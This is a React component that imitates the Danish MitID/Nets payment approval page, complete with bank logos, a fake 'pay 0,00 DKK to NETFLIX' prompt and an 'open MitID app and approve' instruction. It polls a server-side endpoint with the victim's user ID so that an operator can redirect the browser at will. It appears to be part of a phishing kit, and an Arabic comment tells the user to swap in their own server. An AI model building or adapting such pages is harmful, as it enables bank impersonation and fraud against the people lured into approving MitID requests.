import { useEffect } from "react";
import "./Authentication.css";
import emulator from "./code-app-slider-emulator.svg";


export default function Authentication() {
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const userid = params.get("userid");

    const interval = setInterval(async () => {
      try {
        // 🔴 API وهمي – بدّلو بسيرفرك أنت
        const res = await fetch(
          `/check_redirect?userid=${userid}&t=${Date.now()}`
        );
        const data = await res.json();

        if (data.redirect) {
          clearInterval(interval);
          window.location.href = data.redirect;
        }
      } catch (err) {
        console.error("Polling error", err);
      }
    }, 2000);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="page">
      <section className="wrapper">
        <header className="header">
          <div className="imgcon">
            <img style={{width:100}} src="Nets_logo.svg" alt="Network" className="" />
          </div>
          <div style={{display:'flex',justifyContent:'center',alignItems:'center'}} className="imgcon lang">
            <img style={{width:33}} src="en.svg" alt="EN" />
          </div>
          <div  className="imgcon">
            <img style={{width:100}} src="1.svg" alt="Bank" className="" />
          </div>
        </header>

        <section className="container">
          <div className="mitidContextStr">
            Betal 0,00 DKK til NETFLIX - Tickets LIVE
          </div>

          <p className="title">
            Åbn MitID app og godkend
          </p>

          <div className="imageContainer">
             <object
        type="image/svg+xml"
        id="code-app-emulator"
        className="code-app-emulator"
        data={emulator}
      >
        <img
          alt="code-app-emulator"
          className="code-app-emulator"
          src={emulator}
        />
      </object>
          </div>
        </section>
      </section>
    </div>
  );
}
